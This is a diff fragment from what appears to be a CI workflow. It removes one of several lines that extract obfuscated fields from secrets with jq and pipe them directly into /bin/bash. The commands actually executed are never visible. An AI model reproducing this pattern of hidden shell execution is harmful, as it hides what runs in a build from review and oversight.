@@ -21,7 +21,6 @@ jobs:
           ixsx392: ${{ secrets.ixsx392 }}
         run: |
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
-          printf '%s' "$ys38" | jq -r .aqgr99 | /bin/bash
           echo $vnwv65 | jq -r .eijoj69812 | /bin/bash
           echo $ex88 | jq -r .t5 | /bin/bash
           printf '%s' "$tnchz17" | jq -r .ogjmo7621 | /bin/bash
